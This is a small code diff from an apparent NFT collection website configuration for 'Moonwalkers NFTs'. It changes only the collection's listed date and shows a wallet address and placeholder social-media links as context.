@@ -11,7 +11,7 @@ const receiveAddress = "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a";
 
 const collectionInfo = {
     name: "Moonwalkers NFTs",
-    date: "14.05.2022",
+    date: "15.05.2022",
     socialMedia: {
         discord: "discord.gg/invite_here",
         twitter: "https://twitter.com/username_here",
